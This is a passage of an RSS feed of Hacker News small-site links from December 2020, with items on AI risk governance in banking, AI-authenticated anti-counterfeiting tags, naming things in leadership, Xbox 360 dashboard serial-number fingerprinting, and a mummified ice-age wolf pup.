<p>We use several terms throughout this document specific to AI/ML, some of which are subject to vigorous discussions and debates in the research community. Because this document attempts to form a starting point for broader AI/ML governance and risk management efforts, we purposely leverage and encourage readers to refer to various papers for the definition of AI. As such, we note that specific definitions should be (and generally are) tailored to each organization depending on the scope, risk appetite, internal structure, culture, and implementation details of AI/ML efforts.</p>

<p><span>​</span></p>

<p>While there is no universally accepted definition of AI, it is generally understood to refer to “a branch of computer science dealing with the simulation of intelligent behavior in computers, or the capability of a machine to imitate intelligent human behavior.” Generally, machine learning is referred to as, “a field of computer science that uses algorithms to process large amounts of data and learn from it.”<span><a href="https://ai.wharton.upenn.edu/artificial-intelligence-risk-governance/#_ftn2" target="_blank" rel="noopener">[2]</a></span>&nbsp;The term AI is broadly used and typically includes aspects of machine learning and natural language processing. For purposes of this paper, the focus is largely on the use of and potential risks related to machine learning, though the overarching discussion applies more broadly to the abovementioned areas.</p>

<p><span>​</span></p>

<h4>1.4 A Brief Note on AI/ML Uses and Benefits</h4>

<p>The use of AI in financial institutions is increasing as technological barriers have fallen and its benefits and potential risks have become clearer. The Financial Stability Board recently highlighted four areas where AI could impact banking specifically.<span><a href="https://ai.wharton.upenn.edu/artificial-intelligence-risk-governance/#_ftn3" target="_blank" rel="noopener">[3]</a></span>&nbsp;First, customer-facing uses could expand access to credit and other financial services. For example, combining expanded consumer data sets with new ML algorithms to assess credit quality or price insurance policies, and using AI to offer new and innovative channels to deliver financial services could be a potent way to advance financial inclusion. Also, the use of AI chatbots could provide help and even financial advice to consumers, saving them time they might otherwise waste while waiting to speak with a live operator. Second, there is the potential for strengthening back-office operations, such as advanced models for capital optimization, model risk management, stress testing, and market impact analysis. Third, AI approaches could be applied to trading and investment strategies, from identifying new signals on price movements to using past trading behavior to anticipate a client’s next order. Finally, there are likely to be AI advancements in compliance and risk mitigation by banks. AI solutions are already being used by some firms in areas like fraud detection, capital optimization, and portfolio management.</p>

<p><span>​</span></p>

<p>Several papers and articles describe the potential uses and benefits of AI adoption and innovation in financial services. Widespread AI/ML adoption within the financial services industry could provide a unique opportunity to significantly improve financial outcomes for consumers and businesses, if this is done responsibly. That is why AIRS has chosen to focus this paper on understanding and managing the potential risks of AI/ML so that those benefits may be realized.</p>

<p><span>​</span></p>

<h2>2<span>. AI Risks and Risk Categorization</span></h2>

<p>Key potential risks of AI relate to potential harms that may affect organizations, consumers, or create broader detrimental effects on society. Such potential risks may arise in whole or in part from sources including the data used to train the AI system; potential risks arising from the AI system itself; potential risks arising from the usage of the AI system; and potential risks arising from poor overall governance of the AI system.</p>

<p><span>​</span></p>

<h4>2.1 Risk Categorization</h4>

<p>Various research papers, articles, and discussions have covered the topics of risks associated with AI. It is up to individual financial services firms to categorize potential risks of using AI: however, we have included a suggested approach to AI risk categorization in the financial services industry below.</p>

<p><span>​</span></p>

<p>The areas of data related risks, AI/ML attacks, testing and trust, as well as people risk constitute potential areas of risk, which could be subcategorized as illustrated in&nbsp;Figure 1.&nbsp;We address these sub-categories in further detail below.</p>

<p><span>​</span></p>

<p><span>It’s important to note that the applicability and relevance of risks illustrated in Figure 1 are dependent on an individual organization’s risk profile, appetite, and existing controls, and it is up to each firm to determine whether …</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.airsgroup.ai/artificial-intelligence-governance">https://www.airsgroup.ai/artificial-intelligence-governance</a></em></p>]]>
            </description>
            <link>https://www.airsgroup.ai/artificial-intelligence-governance</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513343</guid>
            <pubDate>Wed, 23 Dec 2020 01:09:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[DeepKey: A novel anti-counterfeiting method powered by AI and PUF]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25513312">thread link</a>) | @finphil
<br/>
December 22, 2020 | https://nuadox.com/post/638251976736604160/deepkey | <a href="https://web.archive.org/web/*/https://nuadox.com/post/638251976736604160/deepkey">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="638251976736604160">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/638251976736604160/deepkey"><h2>DeepKey: A novel anti-counterfeiting method</h2></a>
                                <figure data-orig-width="900" data-orig-height="506"><img src="https://64.media.tumblr.com/5f2612e2233aafa67b04f56dc2d00801/c63a4c8653de1bfd-32/s1280x1920/cb74cb74122513e7c7388eae3adcd8cfdbf996e9.jpg" alt="image" data-orig-width="900" data-orig-height="506" width="900" height="506"></figure><p><b>- By <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fnus.edu.sg%2F&amp;t=OWQzM2E1ODU3MzllMDJlNWE5ZGFlMjRlYThkMzA0MzU1NWRkZjdiNSxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608915777">National University of Singapore</a> -</b></p><p>Researchers from the National University of Singapore (NUS) have invented a new method of anti-counterfeiting called <i>DeepKey</i>. This security innovation uses two dimensional (2-D)-material tags and artificial intelligence (AI)-enabled authentication software.</p><figure></figure><p><i>Video:&nbsp;“Anti-counterfeiting tech by NUS researchers does reliable AI authentication under extreme conditions” by&nbsp;National University of Singapore, <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fyoutu.be%2Fz5zwmqfeQ_Y&amp;t=YTJkMGNmMTAxZWE0MTdjNjNhZjMwZjVjOGQwMmYzMGJkYzVmNmVmNyxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608915777">YouTube</a>.</i></p><p>Compared to conventional anti-counterfeiting technologies, <i>DeepKey</i> works faster, achieves highly accurate results, and uses durable identification tags that are not easily damaged by environmental conditions such as extreme temperatures, chemical spills, UV exposure, and moisture. This new authentication technology can be applied to different high-value products, ranging from drugs, jewellery, and electronics. For example, <i>DeepKey</i> is suitable for tagging COVID-19 vaccines to enable rapid and reliable authentication, as some of such vaccines need to be stored at the ultra-cold temperature of -70°C.</p><p>Led by Asst Prof Chen Po-Yen and Asst Prof Wang Xiaonan from the Department of Chemical and Biomolecular Engineering at NUS Faculty of Engineering, the team’s 2D-material secure tags exhibit Physically Unclonable Function patterns (PUF patterns), which are randomly generated by systematically crumpling the 2D-material thin films. The complex 2D-material patterns with multi-scale features can then be classified and validated by a well-trained deep learning model, enabling reliable (100 per cent accurate) authentication in less than 3.5 minutes.</p><p>Current anti-counterfeiting technologies using PUF patterns normally face several bottlenecks, including complicated manufacturing, specialised and tedious readout process, long authentication time, insufficient environmental stability, as well as being costly to make.</p><p>“With this research, we have tackled several bottlenecks that other techniques encounter,” said Asst Prof Wang. “Our 2D-material PUF tags are environmentally stable, easy to read, simple and inexpensive to make. In particular, the adoption of deep learning accelerated the overall authentication significantly, pushing our invention one step further to practical application.”</p><p>The researchers published their results in scientific journal <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.sciencedirect.com%2Fscience%2Farticle%2Fpii%2FS2590238520305592&amp;t=ZmUxYWM2MWE1OTA1MzE5ZWFlY2ZkYmI2NDA0OGI4NmMwMjdhMWQ1Nyxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608915777"><i>Matter</i></a> on 2 December 2020. This study was conducted in collaboration with researchers from Anhui University of Technology and Nanyang Technological University.</p><h2><b>A stable, simple, and scalable process to create PUF tags</b></h2><p>Remarkably, the researchers do not need any special equipment to create the secure tags. They can simply be made with a balloon, a bottle of 2D-material dispersion, and a brush.</p><p>“First, we inflate the balloon and brush over its surface with viscous 2D-material ink. After air-drying overnight, we deflate the balloon. Because of the interfacial mechanical mismatch between the 2D-material and latex substrate, large-area, crumpled PUF patterns are generated during the contraction. These PUF patterns can be cut to the required size afterwards, and normally, hundreds of them can be made at one time,” said Dr Jing Lin, a member of the research team.</p><p>Next, the researchers take a quick image of the PUF tag with an electron microscope, which is then synced to their innovative software to go through the deep learning “classification and validation” process. “The whole process takes less than 3.5 minutes, most of which is spent waiting for the readout from the electron microscope. The authentication itself is very fast, in less than 20 seconds,” explained Dr Jing.</p><figure data-orig-width="2880" data-orig-height="1620"><img src="https://64.media.tumblr.com/32922ca933e0580cc4e864cde80d8ebc/c63a4c8653de1bfd-38/s1280x1920/10ec3b7e954e357ad6da471ea33a0a91997626cc.jpg" alt="image" data-orig-width="2880" data-orig-height="1620" width="1280" height="720"></figure><p><i>Image:&nbsp;A stable, simple, and scalable process to create PUF tags. Credit:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnews.nus.edu.sg%2Freliable-anti-counterfeit-checks-under-extreme-conditions%2F&amp;t=OTJlZDBlNTJjMmY2ZTc3MjNlN2JjNmI4ZDMxYzhjYTI0OWM4ZjNjMyxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608915777">National University of Singapore</a> (click <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fcontent.presspage.com%2Fuploads%2F2580%2F1920_20201221anti-counterfeitingtag-final-01.jpg%3F10000&amp;t=ZjYxYTllZGM3ODMwNzg4ZWM2N2IxYWQxNTgxZDdlYjNiYjg5NjRlNyxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608915777">here</a> for full size).</i></p><h2><b>Fast authentication using AI deep learning algorithms</b></h2><p>All PUF key-based technologies have ultra-high encoding capacities because of the huge numbers of distinct patterns that can be theoretically produced. However, the high encoding capacity also leads to long authentication time, as the “search and compare” pattern validation has to be conducted within a huge database. This trade-off between high encoding capacity and long authentication time often restricts such PUF-based anti-counterfeiting tags from practical applications.</p><p>“With our new technology, we are breaking this long-lasting trade-off between high encoding capacity and long authentication time by using classifiable 2D-material PUF tags and deep learning algorithms,” said Asst Prof Wang.</p><p>First, the researchers used various 2D materials to fabricate PUF tags with AI recognisable features. Second, they trained a deep learning model to conduct a two-step authentication mechanism. “We used the deep learning model to pre-categorise the PUF patterns into subgroups, and so the search-and-compare algorithm is conducted in a much smaller database, which shortens the overall authentication time,” Asst Prof Wang explained.</p><p>Currently, the only available technologies similar to this NUS innovation, are polymer wrinkle-based tags. Wrinkled polymer tags are authenticated based on the surface patterns just like the novel 2D-material tags. However, their authentication presently requires one-by-one feature extraction and matching, which is slow and shows only 80 per cent reliability. The NUS team’s authentication is boosted by deep learning, and is therefore much faster, and reaches nearly 100 per cent validation precision.</p><p>In addition, compared to the wet chemistry preparation of polymer wrinkle-based tags, which involves the use of harmful organic chemicals and UV light, the NUS researchers’ fabrication technique is significantly faster and safer.</p><h2><b>Next steps</b></h2><p>The NUS team has filed a patent for their invention and is now planning to push this technology one step further. “We are searching for better, faster, and more robust readout and authentication approaches for our PUF tags,” said Asst Prof Wang.</p><p>The team has already begun to conduct research on other readout techniques to further shorten the processing time. “In addition, such naturally encoded information by the PUF tags could be further secured by being kept on blockchain, so that the whole supply chain and quality control can be transparently tracked,” Asst Prof Wang added.</p><p>–</p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fnews.nus.edu.sg%2Freliable-anti-counterfeit-checks-under-extreme-conditions%2F&amp;t=OTJlZDBlNTJjMmY2ZTc3MjNlN2JjNmI4ZDMxYzhjYTI0OWM4ZjNjMyxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608915777">National University of Singapore</a></b></p><p><b>Full study:</b>&nbsp;“

Multigenerational Crumpling of 2D Materials for Anticounterfeiting Patterns with Deep Learning Authentication

“, <i>Matter</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fdoi.org%2F10.1016%2Fj.matt.2020.10.005&amp;t=MDQ5NDgyZDllOWVmYTZjNGEyZTNhNDZkYmE1M2RlMTMwMzUyMWRlMSxsd3lMalFPcQ%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F638251976736604160%2Fdeepkey&amp;m=0&amp;ts=1608915777">https://doi.org/10.1016/j.matt.2020.10.005</a></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/190989611467/mit-small-battery-free-id-chip">MIT conceives tiny, battery-free ID chip that can authenticate many products</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/counterfeiting">counterfeiting</a>
                                    
                                        <a href="https://nuadox.com/tagged/ai">ai</a>
                                    
                                        <a href="https://nuadox.com/tagged/artificial-intelligence">artificial intelligence</a>
                                    
                                        <a href="https://nuadox.com/tagged/materials">materials</a>
                                    
                                        <a href="https://nuadox.com/tagged/iot">iot</a>
                                    
                                        <a href="https://nuadox.com/tagged/puf-tag">puf tag</a>
                                    
                                        <a href="https://nuadox.com/tagged/internet-of-things">internet of things</a>
                                    
                                        <a href="https://nuadox.com/tagged/counterfeit">counterfeit</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/638251976736604160/deepkey</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513312</guid>
            <pubDate>Wed, 23 Dec 2020 01:04:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Power in Naming Things]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25513049">thread link</a>) | @mcrittenden
<br/>
December 22, 2020 | https://critter.blog/2020/12/22/power-in-naming-things/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/12/22/power-in-naming-things/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-4614">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>When I first read <a href="https://www.goodreads.com/book/show/40109367-dare-to-lead">Dare To Lead</a> by Brené Brown a few months ago, I hated it. I ranted to my book club about how it’s not actionable. It’s true but not useful, I said, because it’s all <em>why</em> and no <em>how</em>. </p>



<p>Now that I have a few months of life experience under my belt since I read it, I understand the value. Turns out, it’s one of the most impactful books I’ve read in years, because Brené is great at <em>giving things names.</em> </p>



<p>Some examples:</p>



<ul><li>“<a href="https://critter.blog/2020/11/19/avoid-avoiding/">Courage over comfort</a>” meaning we should choose the hard thing that leads to growth over the easy comfortable thing.</li><li>“<a href="https://critter.blog/2020/11/05/respond-to-vulnerability-with-vulnerability/">Rumbling</a>” as a term for honest, vulnerable discussions that feel uncomfortable but build trust.</li><li>“<a href="https://critter.blog/2020/08/13/clear-is-kind-unclear-is-unkind/">Clear is kind, unclear is&nbsp;unkind</a>” meaning that if you’re not being clear about your thoughts and feelings then you’re being unkind, even if you think you’re doing that to be kind.</li><li>“<a href="https://critter.blog/2020/09/17/values-pick-2/">Living into our values</a>” as a reminder to pick your 2 (and only 2) values and use them to make value-based decisions.</li></ul>



<p>The thing is that I <em>knew</em> about all of those things already. I knew that being honest is good. I knew that the hard thing is often the right thing. Blah blah blah. </p>



<p>But giving those guidelines a name made them real and specific and memorable. A name gives us a mantra to repeat in our heads when we come across a tough choice.</p>



<p>The book <a href="https://www.goodreads.com/book/show/33517721-the-culture-code?ac=1&amp;from_search=true&amp;qid=BKStV9pypM&amp;rank=1">The Culture Code</a> talks about naming things and repeating those names over and over and over until they become a part of the culture:</p>



<blockquote><p>A while back Inc. magazine asked executives at six hundred companies to estimate the percentage of their workforce who could name the company’s top three priorities. The executives predicted that 64 percent would be able to name them. When Inc. then asked employees to name the priorities, <em>only 2 percent could do so</em>. </p><p>This is not the exception but the rule. Leaders are inherently biased to presume that everyone in the group sees things as they do, when in fact they don’t. This is why it’s necessary to drastically over-communicate priorities. The leaders I visited with were not shy about this. Statements of priorities were painted on walls, stamped on emails, incanted in speeches, dropped into conversation, and repeated over and over until they became part of the oxygen.</p><cite>Daniel Coyle, The Culture Code</cite></blockquote>



<p>Later, it talks about what a good catchphrase looks like:</p>



<blockquote><p>The trick to building effective catchphrases is to keep them simple, action-oriented, and forthright: “<em>Create fun and a little weirdness</em>” (Zappos), “<em>Talk less, do more</em>” (IDEO), “<em>Work hard, be nice</em>” (KIPP), “<em>Pound the rock</em>” (San Antonio Spurs), “<em>Leave the jersey in a better place</em>” (New Zealand All-Blacks), “<em>Create raves for guests</em>” (Danny Meyer’s restaurants). They’re hardly poetry, but they share an action-based clarity. They aren’t gentle suggestions so much as clear reminders, crisp nudges in the direction the group wants to go.</p><cite>Daniel Coyle, The Culture Code</cite></blockquote>



<p>None of those have a surprising message. Obviously companies want their employees to work hard and be nice, for example. But naming them and repeating them gives them power.</p>



<p>Since understanding this, I’ve been working on defining what my own catchphrases or rules are. <a href="https://anchor.fm/jace-and-critter/episodes/2-The-mantras-we-live-by-eo3mlo">My friend and I just talked about this on our podcast</a>, in fact! Later in the week I’ll post the polished list I’ve decided on.</p>





		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/12/22/power-in-naming-things/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25513049</guid>
            <pubDate>Wed, 23 Dec 2020 00:22:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft's interesting Xbox 360 fingerprinting technique]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25512858">thread link</a>) | @wfme
<br/>
December 22, 2020 | https://qf0.github.io/blog/2020/01/28/Microsoft-xbox-fingerprinting | <a href="https://web.archive.org/web/*/https://qf0.github.io/blog/2020/01/28/Microsoft-xbox-fingerprinting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p><img src="https://raw.githubusercontent.com/qf0/qf0.github.io/master/files/ty508V7sUK.gif" alt="NEX Dashboard Fingerprint"></p>

<h2 id="introduction">Introduction</h2>

<p>Like many others, when I was younger. Owned a Xbox 360 console. The Xbox 360 is one of the most popular game consoles in the past decade. With 85.50 Million units sold. Like any other gaming scene, there tends to be some sort of underground cheating scene, and typically game development company would have a dedicated anti-cheat team etc.
The Xbox 360 was no expection. Like the orginal xbox. It was eventually pwned. Hackers  found ways to execute unsigned code. If youâ€™re interested in learning more in-depth how the Xbox 360 was pwned, or more about underground Xbox 360 stories. You can do so here <a href="https://www.wired.com/story/xbox-underground-videogame-hackers/">Wired Article</a> <a href="https://darknetdiaries.com/episode/45/">Darknet Daries Series</a>
This blog will focus on counter measures that Microsoft used to try and catch hackers.</p>

<h2 id="fingerprinting">Fingerprinting</h2>

<p>In 2008, when the NEX dashboard was relased. Microsoft deployed a fingerprinting technique to try and identify some hackers who posted videos of them hacking. Hackers often had game capture cards that would capture directly display of their xbox 360, record videos and publish them online. 
Typically would display booting up console, loading game, then loading in to a match. I overlooked this when I was younger, and recently just noticed it. The Xbox 360 logo on the Dashboard (Main Menu) prints the consoleâ€™s serial number in morse code with rings around the logo. Which is very clever on Microsoftâ€™s part.
Xbox 360 underground hackers would often cesor their gametag, and other identifiable information prior to publishing cheating, or hacking videos. Though most forgot to censor the logo area. 
Some Xbox 360 underground hackers back in the day, received cease and desist letters from Microsoft. Some got their development kit, or console bricked remotely. Most just got banned. I wonder if this fingerprint method was used to identify some of them.</p>

</div></div>]]>
            </description>
            <link>https://qf0.github.io/blog/2020/01/28/Microsoft-xbox-fingerprinting</link>
            <guid isPermaLink="false">hacker-news-small-sites-25512858</guid>
            <pubDate>Tue, 22 Dec 2020 23:52:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA['Kind of incredible': Researchers reveal details of mummified ice age wolf pup]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25512461">thread link</a>) | @emptybits
<br/>
December 22, 2020 | https://www.cbc.ca/news/canada/north/yukon-ice-age-wolf-pup-research-paper-1.5847730 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/north/yukon-ice-age-wolf-pup-research-paper-1.5847730">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A perfectly preserved ancient wolf pup found in Yukon&nbsp;in 2016 was likely seven weeks old when it died in its den 57,000 years ago and ate fish for its last meal, scientists who studied the rare find said as they shared&nbsp;some of their findings for the first time.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5848092.1608327657!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/ice-age-wolf-pup.jpg"></p></div><figcaption>The intact remains of a wolf pup, named Zhùr, were found by a miner in the Klondike goldfields near Dawson City, Yukon, in 2016. The animal is estimated to be about 57,000 years old and is the most complete mummified grey wolf of its era ever found. <!-- --> <!-- -->(Cheryl Kawaja/CBC)</figcaption></figure><p><span><p>Scientists who have been studying a rare, perfectly preserved ancient wolf pup found in Yukon&nbsp;are&nbsp;sharing&nbsp;some of their findings for the first time.</p>  <p>The 57,000-year-old animal, <a href="https://www.cbc.ca/news/canada/north/mummified-wolf-pup-caribou-yukon-1.4822323">discovered in the gold fields of Yukon</a> in 2016, is the most complete mummified grey wolf of this era ever found.&nbsp;</p>  <p>"She's just so complete," said&nbsp;Julie Meachen, a vertebrate paleontologist from Des Moines University in Iowa and lead author of the new study published this week in the journal&nbsp;<em>Current Biology</em>. "She's so amazing. She's so intact. I mean she even has her fur. Everything is there."</p>  <p>The researchers were amazed to discover even&nbsp;the pup's internal organs were intact.&nbsp;</p>  <p>"We can just learn so much more from an animal with skin and fur and organs than we can with just bones," Meachen said. "This is kind of incredible&nbsp;that we can get all this detail&nbsp;from her when she lived so long ago."&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/ice-age-wolf-pup.jpeg 300w,https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/ice-age-wolf-pup.jpeg 460w,https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/ice-age-wolf-pup.jpeg 620w,https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/ice-age-wolf-pup.jpeg 780w,https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/ice-age-wolf-pup.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5848205.1608566471!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/ice-age-wolf-pup.jpeg"></p></div><figcaption>'She's just so complete. She's so amazing. She's so intact,' said researcher Julie Meachen of Des Moines University in Iowa, seen here with Zhùr and veterinarian Jess Heath at a Whitehorse vet clinic in 2019. Heath is one of several co-authors of the new research paper.<!-- --> <!-- -->(Government of Yukon)</figcaption></figure></span></p>  <p>Through a variety of testing and analysis, the team of researchers was able to determine the pup —&nbsp;named Zhùr,&nbsp;which means "wolf" in the local Indigenous Hän language —&nbsp;was just seven weeks old when it died in its den.&nbsp;</p>  <p>Genetic testing also revealed the wolf is not related to wolves found in North America&nbsp;today.&nbsp;</p>  <p>"We learned she is very closely related to ice age wolves in Europe," said Yukon paleontologist Grant Zazula.</p>  <p>"And that's really interesting because that tells us that there was a major population change that happened in North America with grey wolves at the end of the ice age."</p>  <p>The scientists say they were most surprised to discover something about the diet of the little wolf. The animal's last meal&nbsp;wasn't bison or caribou or muskox as they had expected of the carnivore. It was&nbsp;fish.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/ice-age-wolf.jpeg 300w,https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/ice-age-wolf.jpeg 460w,https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/ice-age-wolf.jpeg 620w,https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/ice-age-wolf.jpeg 780w,https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/ice-age-wolf.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5848217.1608330149!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/ice-age-wolf.jpeg"></p></div><figcaption>An artist's rendering of Zhùr's world, 57,000 years ago. Researchers were surprised to discover that the wolf pup's diet seemed to include fish.<!-- --> <!-- -->(Julius Csotonyi)</figcaption></figure></span></p>  <p>"Based on the analysis of chemical components in her hair and other tissues, we were able to determine what her last meal was," said&nbsp;Zazula.&nbsp;</p>  <p>He says looking at things such as&nbsp;the ratio of carbon and nitrogen preserved in the tissue, it was clear the pup was eating aquatic species, most likely salmon.&nbsp;</p>  <h2>Culturally significant&nbsp;</h2>  <p>Zhùr is&nbsp;significant&nbsp;not only to&nbsp;the scientists&nbsp;but also to the Tr'ondëk Hwëch'in First Nation in Yukon.&nbsp;</p>  <p>"We are connected to this wolf pup," says&nbsp;Debbie Nagano, the director of heritage for the Tr'ondëk Hwëch'in&nbsp;and a member of the First Nation's wolf clan.&nbsp;</p>  <p>Soon after the initial discovery, Zhùr&nbsp;was brought back to Dawson City&nbsp;for a special blessing ceremony with First Nations elders&nbsp;and was given a&nbsp;name. Nagano says before the animal&nbsp;went off for analysis, the First Nation worked with the scientists to ensure Zhùr&nbsp;wouldn't be treated just as a specimen.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/grant-zazula.jpg 300w,https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/grant-zazula.jpg 460w,https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/grant-zazula.jpg 620w,https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/grant-zazula.jpg 780w,https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/grant-zazula.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5848406.1608334105!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/grant-zazula.jpg"></p></div><figcaption>Yukon paleontologist Grant Zazula with Zhùr.<!-- --> <!-- -->(Cheryl Kawaja/CBC)</figcaption></figure></span></p>  <p>"That side is quite important to us,"&nbsp;Nagano said. "There is a connection to it. We don't want it to be just handled in the view of, 'It's just an artifact.'</p>  <p>"We really want it to be able to have the respect behind it also. Not in the way it's respected physically; it also need to be respected spiritually."&nbsp;</p>  <p>Nagano says the discovery of Zhùr&nbsp;has also helped improve the relationships between the First Nation and scientists, and also with the government and the mining community.&nbsp;</p>  <p>"This wolf pup is bringing us together in a good way, that we can all learn from it," she said. "That part is a good way to be thankful for this wolf pup."&nbsp;</p>  <h2>Rare find</h2>  <p>For their part, the scientists are also grateful to the placer miner who first discovered Zhùr,&nbsp;in 2016.</p>  <p>Neil Loveless came across the animal thawing out of the permafrost.&nbsp;</p>  <p>"I just saw this thing that didn't quite look right," he recalled. "I picked it up and to be honest, I thought maybe it was like an old, like a puppy or something ...&nbsp;that had fallen down the mine&nbsp;shaft."&nbsp;</p>  <p>He put the remains&nbsp;in a gold pan and later in a freezer until a&nbsp;paleontologist arrived to have a look.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_300/neil-loveless.jpeg 300w,https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_460/neil-loveless.jpeg 460w,https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_620/neil-loveless.jpeg 620w,https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_780/neil-loveless.jpeg 780w,https://i.cbc.ca/1.5848215.1608566502!/fileImage/httpImage/image.jpeg_gen/derivatives/original_1180/neil-loveless.jpeg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" 